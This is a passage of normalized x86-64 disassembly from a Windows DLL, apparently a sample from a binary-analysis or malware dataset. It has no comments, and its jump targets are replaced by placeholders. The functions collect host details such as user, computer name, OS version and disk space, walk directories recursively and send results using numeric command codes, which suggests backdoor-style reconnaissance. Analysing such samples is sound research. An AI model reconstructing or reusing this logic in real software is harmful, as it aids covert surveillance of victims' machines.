lea rdx [ r--data ]
mov rcx 0xffffffff80000002
mov [ rsp + 0x58 ] 0x0
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
add rsp 0x30
pop rbx
retn
mov rcx [ rsp + 0x58 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x20 ] rbx
call [ RegQueryValueExA@IAT ]
mov rcx [ rsp + 0x58 ]
call [ RegCloseKey@IAT ]
sub_10008d20
sub rsp 0x38
xor eax eax
lea r8 [ rsp + 0x58 ]
lea rdx [ r--data ]
mov rcx 0xffffffff80000002
mov [ rsp + 0x48 ] 0x4
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x58 ] rax
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov ax [ rsp + 0x40 ]
add rsp 0x38
retn
mov rcx [ rsp + 0x58 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x40 ]
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x20 ] rax
call [ RegQueryValueExA@IAT ]
mov rcx [ rsp + 0x58 ]
call [ RegCloseKey@IAT ]
sub_10008da0
mov rax rsp
sub rsp 0x68
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
mov rbx rcx
call [ GetCurrentProcessId@IAT ]
lea rdx [ rbx + 0x36c ]
xor ecx ecx
mov r8d 0x80
mov [ rbx + 0x368 ] eax
call [ GetModuleFileNameA@IAT ]
mov edi 0x7f
mov r8d edi
sub r8d eax
test r8d r8d
jle r-xdata
lea rcx [ rbx + 0x3ec ]
lea rdx [ rsp + 0x70 ]
mov [ rsp + 0x70 ] 0x20
call [ GetUserNameA@IAT ]
lea rcx [ rbx + 0x40c ]
mov edx 0x80
call [ GetWindowsDirectoryA@IAT ]
sub edi eax
test edi edi
jle r-xdata
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x20 ]
call [ GlobalMemoryStatus@IAT ]
mov r11 [ rsp + 0x28 ]
lea rcx [ rbx + 0x494 ]
mov edx 0x78
mov [ rbx + 0x48c ] r11
call sub_10008cb0
call sub_10008d20
mov rdi [ rsp + 0x88 ]
mov [ rbx + 0x50c ] ax
mov rbx [ rsp + 0x80 ]
add rsp 0x68
retn
cdqe
mov edx edi
lea rcx [ rax + rbx + 0x40d ]
call [ GetSystemDirectoryA@IAT ]
cdqe
lea rdx [ rax + rbx + 0x36d ]
call [ GetModuleFileNameA@IAT ]
sub_10008e90
push rbx
sub rsp 0x20
xor bl bl
call [ GetCurrentProcessId@IAT ]
mov ebx eax
call [ GetTickCount@IAT ]
add bl al
jmp r-xdata
cmp bl 0xff
jne r-xdata
test bl bl
je r-xdata
mov al bl
add rsp 0x20
pop rbx
retn
sub_10008ec0
xor r9d r9d
test edx edx
mov r10d 0x7ab7
mov r8 r9
movsxd r11 edx
jle r-xdata
mov eax r9d
retn
movzx edx [ r8 + rcx ]
mov eax r10d
add r8 0x1
imul r10d r10d 0x6a2f
imul eax r9d
cmp r8 r11
lea r9d [ rax + rdx ]
jl r-xdata
sub_10008f00
sub rsp 0x38
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x20 ] 0x0
mov rdi rcx
mov rbx rdx
call sub_10007cd0
test eax eax
jg r-xdata
xor r9d r9d
lea rdx [ rsp + 0x20 ]
mov rcx rdi
lea r8d [ r9 + 0x4 ]
call [ rw-data ]
cmp eax 0x4
jne r-xdata
xor eax eax
mov rdi [ rsp + 0x58 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x38
retn
mov eax [ rsp + 0x20 ]
mov rdi [ rsp + 0x58 ]
mov [ rbx ] eax
mov rbx [ rsp + 0x50 ]
mov eax 0x1
add rsp 0x38
retn
sub_10008f70
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x40 ] rsi
xor ebp ebp
test r8d r8d
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x20 ] r12
mov r12 rdx
mov ebx ebp
mov edi r8d
mov rsi rcx
jle r-xdata
mov r12 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
cmp ebx edi
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x30 ]
sete bpl
mov eax ebp
mov rbp [ rsp + 0x38 ]
add rsp 0x28
retn
nop
mov r8d edi
movsxd rdx ebx
xor r9d r9d
sub r8d ebx
add rdx r12
mov rcx rsi
call [ rw-data ]
test eax eax
jle r-xdata
add ebx eax
cmp ebx edi
jl r-xdata
mov rcx rsi
call sub_10007c80
test eax eax
jle r-xdata
sub_10009000
mov r11 rsp
sub rsp 0xbc8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb90 ] rax
mov [ r11 - 0x8 ] rbx
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] rdi
mov rbp rcx
mov esi r8d
mov rdi rdx
mov [ r11 - 0x28 ] r12
mov r12 [ rsp + 0xbf0 ]
lea rcx [ r11 - 0xad8 ]
xor edx edx
mov r8d 0x550
movzx ebx r9w
call memset
mov [ rsp + 0xf8 ] 0x80000002
mov [ rsp + 0xf0 ] 0xdf1f1ed3
mov [ rsp + 0x5fe ] bx
xor ecx ecx
lea rdx [ rw-data ]
movzx eax [ rcx + rdx ]
add rcx 0x1
test al al
mov [ rsp + rcx + 0x13b ] al
jne r-xdata
lea r8 [ r--data ]
lea rcx [ rsp + 0x600 ]
mov r9 rdi
mov edx 0x40
mov [ rsp + 0x20 ] esi
call [ _snprintf@IAT ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0xfc ]
mov [ rsp + 0x40 ] 0x40
call [ GetComputerNameA@IAT ]
call [ GetSystemDefaultLangID@IAT ]
movzx ebx ax
call [ GetACP@IAT ]
lea rcx [ rsp + 0x50 ]
shl eax 0x10
mov [ rsp + 0x50 ] 0x9c
or eax ebx
mov [ rsp + 0xf4 ] eax
call [ GetVersionExA@IAT ]
movzx eax [ rsp + 0x54 ]
mov r11d [ rsp + 0x5c ]
mov [ rsp + 0x15c ] eax
movzx eax [ rsp + 0x58 ]
mov [ rsp + 0x160 ] eax
mov [ rsp + 0x164 ] r11d
xor ecx ecx
movzx eax [ rsp + rcx + 0x64 ]
add rcx 0x1
test al al
mov [ rsp + rcx + 0x167 ] al
jne r-xdata
mov eax [ rsp + 0x54 ]
cmp eax 0x6
jne r-xdata
cmp eax 0x5
jne r-xdata
cmp [ rsp + 0xea ] 0x1
je r-xdata
mov [ rsp + 0x35 ] 0x3a
mov [ rsp + 0x36 ] 0x0
xor esi esi
mov bl 0x41
lea rdi [ rsp + 0x1ec ]
nop
cmp [ rsp + 0x58 ] 0x2
jne r-xdata
bts [ rsp + 0x15c ] 0x1f
jmp r-xdata
cmp eax 0x5
movsx ecx bl
mov [ rdi - 0x4 ] eax
mov [ rdi ] ecx
je r-xdata
cmp eax 0x5
je r-xdata
lea ecx [ rax + 0x54 ]
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
add esi 0x1
add rdi 0x18
movsxd rax esi
xor edx edx
lea rcx [ rax + rax * 2 ]
lea r9 [ rsp + rcx * 8 + 0x1f8 ]
lea r8 [ rsp + rcx * 8 + 0x1f0 ]
lea rcx [ rsp + 0x34 ]
call [ GetDiskFreeSpaceExA@IAT ]
cmp eax 0x6
jne r-xdata
bts [ rsp + 0x15c ] 0x1f
lea rcx [ rsp + 0x34 ]
mov [ rsp + 0x34 ] bl
call [ GetDriveTypeA@IAT ]
cmp eax 0x3
je r-xdata
lea rcx [ rsp + 0xf0 ]
call sub_10008da0
lea rcx [ rsp + 0x640 ]
xor edx edx
mov r8d 0x550
call memset
lea r8 [ rsp + 0xf0 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x640 ]
mov r9d 0x550
mov [ rsp + 0x38 ] 0x550
mov [ rsp + 0x20 ] 0x8
call sub_10011660
call sub_10008e90
mov edx [ rsp + 0x38 ]
movzx ebx al
mov ecx ebx
shl ecx 0x18
add ecx edx
mov [ rsp + 0x44 ] ecx
lea rcx [ rsp + 0x640 ]
call sub_10008ec0
lea rdx [ rsp + 0x44 ]
mov r8d 0x4
mov rcx rbp
mov [ rsp + 0x3c ] 0x0
mov edi eax
call sub_10008f70
mov rsi [ rsp + 0xbb0 ]
test eax eax
jne r-xdata
add bl 0x1
cmp bl 0x5a
jle r-xdata
mov r8d [ rsp + 0x38 ]
lea rdx [ rsp + 0x640 ]
mov rcx rbp
call sub_10008f70
test eax eax
je r-xdata
mov eax 0xffffffff
jmp r-xdata
lea rdx [ rsp + 0x3c ]
mov rcx rbp
call sub_10008f00
test eax eax
je r-xdata
mov r12 [ rsp + 0xba0 ]
mov rdi [ rsp + 0xba8 ]
mov rbp [ rsp + 0xbb8 ]
mov rbx [ rsp + 0xbc0 ]
mov rcx [ rsp + 0xb90 ]
xor rcx rsp
call sub_10010a60
add rsp 0xbc8
retn
cmp edi [ rsp + 0x3c ]
lea rdx [ rsp + 0x30 ]
mov r8d 0x1
mov rcx rbp
sete [ rsp + 0x30 ]
call sub_10008f70
test eax eax
je r-xdata
movzx eax [ rsp + 0x30 ]
mov [ r12 ] bl
sub_10009320
cmp [ rcx ] 0x2e
jne r-xdata
xor eax eax
retn
movzx eax [ rcx + 0x1 ]
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
mov eax 0x1
retn
cmp [ rcx + 0x2 ] 0x0
je r-xdata
sub_10009340
mov r11 rsp
sub rsp 0x178
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x160 ] rax
mov [ r11 + 0x18 ] rbx
mov rbx rcx
mov [ r11 + 0x20 ] rdi
xor ecx ecx
xor edi edi
call [ SetLastError@IAT ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call [ FindFirstFileA@IAT ]
cmp rax 0xffffffffffffffff
mov rbx rax
je r-xdata
mov rbx [ rsp + 0x190 ]
mov eax edi
mov rdi [ rsp + 0x198 ]
mov rcx [ rsp + 0x160 ]
xor rcx rsp
call sub_10010a60
add rsp 0x178
retn
test [ rsp + 0x20 ] 0x10
je r-xdata
add edi 0x1
lea rcx [ rsp + 0x4c ]
call sub_10009320
test eax eax
jne r-xdata
mov rcx rbx
call [ FindClose@IAT ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
sub_100093f0
mov r11 rsp
sub rsp 0x1b8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x190 ] rax
cmp [ rdx ] 0x0
mov [ r11 - 0x8 ] rbp
mov [ r11 - 0x10 ] rsi
mov rsi rcx
mov rbp r8
mov [ rsp + 0x38 ] rdx
je r-xdata
mov rsi [ rsp + 0x1a8 ]
mov rbp [ rsp + 0x1b0 ]
mov rcx [ rsp + 0x190 ]
xor rcx rsp
call sub_10010a60
add rsp 0x1b8
retn
cmp [ r8 ] 0x0
je r-xdata
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x18 ] rdi
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
cmp ecx 0x104
mov rbx rcx
jge r-xdata
mov rbx [ rsp + 0x1d8 ]
mov rdi [ rsp + 0x1a0 ]
mov rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
sub rcx 0x1
cmp rcx 0x104
jae r-xdata
mov ecx 0x400
call ??2@YAPEAX_K@Z
mov rdx rbp
mov r8 rax
mov [ rsp + 0x48 ] rax
sub rax rbp
nop
nop
nop
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ rax + rdx - 0x1 ] cl
jne r-xdata
movsxd rax ebx
mov [ rsp + 0x40 ] rax
cmp [ rax + r8 - 0x1 ] 0x5c
je r-xdata
mov rdx [ rsp + 0x38 ]
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
nop
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
lea rdx [ rsp + 0x50 ]
mov rcx r8
call [ FindFirstFileA@IAT ]
cmp rax 0xffffffffffffffff
mov [ rsp + 0x30 ] rax
je r-xdata
mov rcx [ rsp + 0x48 ]
call ??3@YAXPEAX@Z
nop
mov rcx [ rsp + 0x30 ]
call [ FindClose@IAT ]
mov rcx rsi
call sub_10004a20
test eax eax
jne r-xdata
cmp [ rsi + 0x28 ] eax
jne r-xdata
lea rcx [ rsp + 0x7c ]
call sub_10009320
test eax eax
jne r-xdata
mov rcx [ rsp + 0x30 ]
lea rdx [ rsp + 0x50 ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
test [ rsp + 0x50 ] 0x10
je r-xdata
cmp [ rsi + 0x64 ] 0x0
je r-xdata
mov ecx 0x400
call ??2@YAPEAX_K@Z
xor edx edx
mov r8d 0x400
mov rcx rax
mov rbx rax
call memset
mov edx [ rsp + 0x50 ]
lea r8 [ rbx + 0x4 ]
mov [ rbx ] edx
mov ecx [ rsp + 0x6c ]
add r8 0x8
mov [ r8 - 0x8 ] ecx
mov ecx [ rsp + 0x70 ]
mov rdx r8
mov [ r8 - 0x4 ] ecx
sub rdx rbp
mov rcx rbp
mov ecx 0x400
call ??2@YAPEAX_K@Z
mov rdx rbp
mov rbx rax
sub rax rbp
nop
nop
nop
nop
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
mov rax [ rsp + 0x40 ]
cmp [ rax + r8 - 0x1 ] 0x5c
je r-xdata
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ rax + rdx - 0x1 ] cl
jne r-xdata
mov rax [ rsp + 0x40 ]
cmp [ rax + rbx - 0x1 ] 0x5c
je r-xdata
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x7c ]
nop
nop
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
xor eax eax
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x7c ]
nop
nop
xor eax eax
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
mov rdi r8
xor eax eax
sub r8d ebx
mov rcx 0xffffffffffffffff
mov r9 rbx
mov edx 0xa021
[ rdi ]
mov [ rsp + 0x28 ] 0x0
not rcx
lea eax [ rcx + r8 ]
mov r8d 0x400
mov rcx rsi
mov [ rsp + 0x20 ] eax
call sub_10004e70
mov rcx rbx
call ??3@YAXPEAX@Z
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
mov rdx [ rsp + 0x38 ]
mov r8 rbx
mov rcx rsi
call sub_100093f0
mov rcx rbx
call ??3@YAXPEAX@Z
jmp r-xdata
sub_10009750
mov r11 rsp
sub rsp 0x1a8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x180 ] rax
cmp [ rdx ] 0x0
mov [ r11 - 0x8 ] rbp
mov [ r11 - 0x10 ] rsi
mov rsi rcx
mov rbp r8
mov [ rsp + 0x30 ] rdx
je r-xdata
mov rsi [ rsp + 0x198 ]
mov rbp [ rsp + 0x1a0 ]
mov rcx [ rsp + 0x180 ]
xor rcx rsp
call sub_10010a60
add rsp 0x1a8
retn
cmp [ r8 ] 0x0
je r-xdata
mov [ r11 + 0x20 ] rbx
mov [ r11 - 0x18 ] rdi
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
sub rcx 0x1
cmp ecx 0x104
mov rbx rcx
jge r-xdata
mov rbx [ rsp + 0x1c8 ]
mov rdi [ rsp + 0x190 ]
mov rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
sub rcx 0x1
cmp rcx 0x104
jae r-xdata
mov ecx 0x400
call ??2@YAPEAX_K@Z
mov rdx rbp
mov r8 rax
mov [ rsp + 0x20 ] rax
sub rax rbp
nop
nop
nop
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ rax + rdx - 0x1 ] cl
jne r-xdata
movsxd rax ebx
mov [ rsp + 0x38 ] rax
cmp [ rax + r8 - 0x1 ] 0x5c
je r-xdata
mov rdx [ rsp + 0x30 ]
mov rdi r8
xor eax eax
mov rcx 0xffffffffffffffff
mov r8 rbp
[ rdi ]
movzx eax [ r--data ]
mov rcx rsi
mov [ rdi - 0x1 ] ax
call sub_100093f0
mov rbx [ rsp + 0x20 ]
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call [ FindFirstFileA@IAT ]
cmp rax 0xffffffffffffffff
mov rdi rax
mov [ rsp + 0x28 ] rax
je r-xdata
xor eax eax
mov rdi r8
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
mov rcx rbx
call ??3@YAXPEAX@Z
cmp [ rsi + 0x64 ] 0x0
je r-xdata
mov rcx rdi
call [ FindClose@IAT ]
mov rbx [ rsp + 0x20 ]
mov rcx rsi
call sub_10004a20
test eax eax
jne r-xdata
cmp [ rsi + 0x28 ] eax
jne r-xdata
lea rcx [ rsp + 0x6c ]
call sub_10009320
test eax eax
jne r-xdata
lea rdx [ rsp + 0x40 ]
mov rcx rdi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
test [ rsp + 0x40 ] 0x10
je r-xdata
mov ecx 0x400
call ??2@YAPEAX_K@Z
mov rdx rbp
mov rbx rax
sub rax rbp
nop
nop
movzx ecx [ rdx ]
add rdx 0x1
test cl cl
mov [ rax + rdx - 0x1 ] cl
jne r-xdata
mov rax [ rsp + 0x38 ]
cmp [ rax + rbx - 0x1 ] 0x5c
je r-xdata
xor eax eax
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x6c ]
nop
nop
xor eax eax
mov rdi rbx
mov rcx 0xffffffffffffffff
[ rdi ]
movzx eax [ r--data ]
mov [ rdi - 0x1 ] ax
movzx eax [ rdx + rcx ]
add rcx 0x1
test al al
mov [ rdi + rcx - 0x2 ] al
jne r-xdata
mov rdx [ rsp + 0x30 ]
mov r8 rbx
mov rcx rsi
call sub_10009750
mov rcx rbx
call ??3@YAXPEAX@Z
mov rdi [ rsp + 0x28 ]
sub_100099d0
mov r11 rsp
sub rsp 0x158
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x140 ] rax
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 - 0x8 ] rdi
mov rdi rcx
call sub_10007c20
mov rbx [ rdi ]
mov rbp [ rdi + 0x8 ]
mov rcx rdi
call ??3@YAXPEAX@Z
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi rbp
[ rdi ]
cmp [ rbp ] al
not rcx
lea rdi [ rcx + rbp ]
je r-xdata
mov rcx rbp
call ??3@YAXPEAX@Z
mov [ rsp + 0x28 ] 0x0
xor edi edi
test rdi rdi
je r-xdata
cmp [ rdi ] al
je r-xdata
mov rcx rbp
call ??3@YAXPEAX@Z
mov rcx rbx
call sub_10004a20
xor edi edi
test eax eax
jne r-xdata
mov [ rsp + 0x178 ] rsi
mov rbp [ rsp + 0x170 ]
mov [ rbx + 0x50 ] rdi
mov [ rbx + 0x64 ] edi
mov rdi [ rsp + 0x150 ]
mov rbx [ rsp + 0x168 ]
mov rcx [ rsp + 0x140 ]
xor rcx rsp
call sub_10010a60
add rsp 0x158
retn
cmp [ rbx + 0x28 ] edi
jne r-xdata
mov rsi [ rsp + 0x178 ]
mov edx 0x3b
mov rcx rdi
call [ strchr@IAT ]
test rax rax
mov rsi rax
je r-xdata
mov [ rsp + 0x28 ] di
jmp r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rbx
call sub_10009750
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x104
call memset
mov r8 rsi
lea rcx [ rsp + 0x30 ]
sub r8 rdi
mov rdx rdi
call [ strncpy@IAT ]
lea r8 [ rsp + 0x30 ]
mov rdx rbp
mov rcx rbx
call sub_10009750
cmp [ rsi + 0x1 ] 0x0
lea rdi [ rsi + 0x1 ]
jne r-xdata
xor r9d r9d
mov edx 0xa021
mov rcx rbx
lea r8d [ r9 - 0x1 ]
mov [ rsp + 0x20 ] edi
call sub_10004e70
cmp [ rbx + 0x64 ] 0x0
je r-xdata
jmp r-xdata
sub_10009b40
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rbp
lea eax [ rdx + 0x1 ]
mov [ rsp + 0x40 ] rsi
movsxd rbp eax
mov [ rsp + 0x48 ] rdi
mov rdi rcx
mov rcx rbp
mov esi edx
call ??2@YAPEAX_K@Z
test rax rax
mov rbx rax
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
mov r8 rbp
xor edx edx
mov rcx rax
call memset
mov r8d esi
mov rdx rbx
mov rcx rdi
call sub_10004db0
cmp eax esi
je r-xdata
mov ecx 0x218
call ??2@YAPEAX_K@Z
lea rcx [ sub_100099d0 ]
xor edx edx
mov [ rax ] rdi
mov [ rax + 0x8 ] rbx
mov r8 rax
mov [ rdi + 0x64 ] 0x1
call [ _beginthread@IAT ]
mov [ rdi + 0x50 ] rax
mov rcx rbx
call ??3@YAXPEAX@Z
jmp r-xdata
sub_10009bf0
sub rsp 0x168
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
xor edx edx
mov [ rsp + 0x188 ] rdi
lea ecx [ rdx + 0x2 ]
call [ rw-data ]
cmp rax 0xffffffffffffffff
mov rdi rax
jne r-xdata
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x12c
mov [ rsp + 0x180 ] rbx
xor ebx ebx
call memset
lea rdx [ rsp + 0x20 ]
mov rcx rdi
mov [ rsp + 0x20 ] 0x130
call [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov eax ebx
mov rbx [ rsp + 0x180 ]
nop
mov rdi [ rsp + 0x188 ]
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_10010a60
add rsp 0x168
retn
lea rdx [ rsp + 0x20 ]
mov rcx rdi
add ebx 0x1
call [ rw-data ]
test eax eax
jne r-xdata
sub_10009cb0
mov r11 rsp
sub rsp 0x2c8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x290 ] rax
mov [ r11 + 0x20 ] rbp
mov rbp rcx
mov [ r11 - 0x10 ] rdi
mov edi edx
lea rcx [ r11 - 0x148 ]
mov r8d 0x10c
xor edx edx
call memset
lea rdx [ rsp + 0x180 ]
mov r8d edi
mov rcx rbp
call sub_10004db0
cmp eax edi
je r-xdata
xor eax eax
mov [ rsp + 0x2c0 ] rsi
lea rdi [ rsp + 0x180 ]
mov rcx 0xffffffffffffffff
mov [ rsp + 0x2b0 ] r12
mov [ rsp + 0x2a8 ] r13
[ rdi ]
mov eax [ r--data ]
mov [ rdi - 0x1 ] eax
movzx eax [ r--data ]
mov [ rdi + 0x3 ] al
call sub_10007c20
lea rcx [ rsp + 0x180 ]
mov r12d eax
call sub_10009340
test eax eax
movsxd r13 eax
jle r-xdata
mov eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x52e
je r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x180 ]
call [ FindFirstFileA@IAT ]
cmp rax 0xffffffffffffffff
mov rsi rax
je r-xdata
mov rdi [ rsp + 0x2b8 ]
mov rbp [ rsp + 0x2e8 ]
mov rcx [ rsp + 0x290 ]
xor rcx rsp
call sub_10010a60
add rsp 0x2c8
retn
lea r9 [ rsp + 0x30 ]
mov edx 0xa000
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0xfffffffe
mov [ rsp + 0x34 ] eax
mov [ rsp + 0x20 ] 0x8
call sub_10004e70
cmp eax 0x5
je r-xdata
lea rdi [ r13 + r13 * 4 ]
mov [ rsp + 0x2e0 ] rbx
mov [ rsp + 0x2a0 ] r14
shl rdi 0x6
mov rcx rdi
call ??2@YAPEAX_K@Z
mov r8 rdi
xor edx edx
mov rcx rax
mov rbx rax
call memset
mov r14 rbx
mov r12 [ rsp + 0x2b0 ]
mov rsi [ rsp + 0x2c0 ]
mov r13 [ rsp + 0x2a8 ]
mov eax 0x1
call [ RevertToSelf@IAT ]
cmp eax 0x3ed
je r-xdata
mov [ rbx ] edx
mov eax [ rsp + 0x5c ]
lea rdx [ rbx + 0xc ]
mov [ rbx + 0x4 ] eax
mov eax [ rsp + 0x60 ]
lea rcx [ rsp + 0x6c ]
mov [ rbx + 0x8 ] eax
lea rax [ rsp + 0x6c ]
sub rdx rax
nop
nop
lea rcx [ rsp + 0x6c ]
call sub_10009320
test eax eax
jne r-xdata
cmp eax 0x15
je r-xdata
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
lea rdi [ rsp + 0x6c ]
xor eax eax
mov rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rbx [ rbx + rcx + 0xc ]
lea rdx [ rsp + 0x40 ]
mov rcx rsi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
cmp eax 0x3
je r-xdata
mov edx [ rsp + 0x40 ]
test dl 0x10
je r-xdata
mov rcx rsi
mov [ rbx ] 0xffffffff
call [ FindClose@IAT ]
lea r8d [ r13 + r13 * 4 ]
sub ebx r14d
add ebx 0x4
mov r9 r14
mov edx 0xa000
shl r8d 0x6
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] ebx
call sub_10004e70
mov rcx r14
call ??3@YAXPEAX@Z
mov r14 [ rsp + 0x2a0 ]
mov rbx [ rsp + 0x2e0 ]
test r12d r12d
jmp r-xdata
cmp eax 0x7b
je r-xdata
je r-xdata
lea r9 [ rsp + 0x30 ]
mov edx 0xa000
mov r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x28 ] 0x0
mov [ rsp + 0x30 ] 0xffffffff
mov [ rsp + 0x20 ] 0x4
call sub_10004e70
jmp r-xdata
test r12d r12d
sub_10009f70
mov r11 rsp
sub rsp 0x118
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xf0 ] rax
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x20 ] rsi
mov rbx rcx
call sub_10007c20
mov esi [ rbx + 0x8 ]
cmp esi [ rbx + 0xc ]
ja r-xdata
mov rcx rbx
call ??3@YAXPEAX@Z
mov rsi [ rsp + 0x138 ]
mov rbx [ rsp + 0x128 ]
mov rcx [ rsp + 0xf0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x118
retn
mov [ rsp + 0x130 ] rbp
mov [ rsp + 0x108 ] r12
xor r12d r12d
mov [ rsp + 0x110 ] rdi
lea rbp [ r--data ]
nop
nop
mov rcx [ rbx ]
call sub_10004a20
test eax eax
jne r-xdata
mov ecx esi
call [ rw-data ]
mov ecx eax
mov [ rsp + 0x30 ] eax
call [ rw-data ]
lea rcx [ rsp + 0x70 ]
xor edx edx
mov r8d 0x80
mov rdi rax
call memset
mov rdx r12
nop
nop
nop
mov rdi [ rsp + 0x110 ]
mov rbp [ rsp + 0x130 ]
mov r12 [ rsp + 0x108 ]
mov rax [ rbx ]
cmp [ rax + 0x28 ] r12d
jne r-xdata
movzx ecx [ rdx + rbp ]
add rdx 0x2
test cx cx
mov [ rsp + rdx + 0x6e ] cx
jne r-xdata
lea rax [ rsp + 0x74 ]
mov r9d 0xffffffff
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] 0x3e
mov [ rsp + 0x20 ] rax
call [ MultiByteToWideChar@IAT ]
xor eax eax
lea rdi [ rsp + 0x70 ]
mov rcx 0xffffffffffffffff
lea r9 [ rsp + 0x34 ]
[ rdi ]
mov rax [ r--data ]
lea r8 [ rsp + 0x38 ]
mov [ rdi - 0x2 ] rax
mov eax [ r--data ]
mov edx 0x2
mov [ rdi + 0x6 ] eax
xor eax eax
xor ecx ecx
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x60 ] rax
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x58 ] rax
lea rax [ rsp + 0x70 ]
mov [ rsp + 0x34 ] r12d
mov [ rsp + 0x40 ] rax
lea rax [ rbx + 0x10 ]
mov [ rsp + 0x54 ] 0x3
mov [ rsp + 0x60 ] rax
lea rax [ rbx + 0x110 ]
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x48 ] rax
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ rax + 0x60 ] r12d
je r-xdata
mov rcx [ rbx ]
lea r9 [ rsp + 0x30 ]
lea r8d [ rax - 0x1 ]
mov edx 0x9fee
mov [ rsp + 0x28 ] r12w
